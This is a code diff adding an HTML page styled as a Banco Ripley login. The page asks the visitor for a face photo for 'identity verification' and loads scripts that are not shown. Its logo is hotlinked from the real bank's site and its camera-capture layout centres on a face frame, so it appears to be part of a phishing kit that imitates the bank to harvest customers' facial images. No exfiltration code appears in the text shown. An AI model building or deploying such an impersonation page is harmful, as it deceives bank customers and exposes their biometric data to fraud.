@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banco Ripley - Login</title>
+  <link rel="stylesheet" href="stylefacial.css">
+</head>
+<body>
+  <div class="screen">
+    <header class="top-bar">
+    </header>
+
+    <main class="content">
+      <div class="logo-wrap">
+        <img src="https://www.bancoripley.cl/media/logo-banco-ripley-DKG6FRYM.svg" style="width: 100px;">
+      </div>
+
+      <h1 class="title">Verificación de Identidad</h1>
+      <p class="subtitle">Para continuar, necesitamos verificar tu identidad. Coloca tu rostro dentro del marco y mantente quieto.</p>
+
+      <!-- Cámara y marco -->
+      <div class="camera-container">
+        <video id="video" autoplay muted playsinline></video>
+        <canvas id="canvas" style="display: none;"></canvas>
+        
+        <!-- Marco para la cara -->
+        <div class="face-frame">
+            <div class="frame-corners">
+                <div class="corner top-left"></div>
+                <div class="corner top-right"></div>
+                <div class="corner bottom-left"></div>
+                <div class="corner bottom-right"></div>
+            </div>
+        </div>
+
+        <!-- Overlay de instrucciones -->
+        <div class="overlay" id="overlay">
+            <div class="status-message" id="statusMessage">
+                <i class="fas fa-camera" id="statusIcon"></i>
+                <span id="statusText">Iniciando cámara...</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Controles -->
+    <div class="controls">
+        <button class="btn primary" id="captureBtn" style="display: none;">
+            <i class="fas fa-camera"></i>
+            Tomar Foto
+        </button>
+        
+        <button class="btn secondary" id="retryBtn" style="display: none;">
+            <i class="fas fa-redo"></i>
+            Intentar de Nuevo
+        </button>
+        
+        <button class="btn primary" id="continueBtn" style="display: none;">
+            <i class="fas fa-check"></i>
+            Continuar
+        </button>
+    </div>
+
+      <p class="subtitle">Toma la foto y continua el proceso de validacion</p>
+
+    </main>
+
+    <script src="app.js"></script>
+    <script src="face-detection.js"></script>
+  </div>
+</body>
+</html>
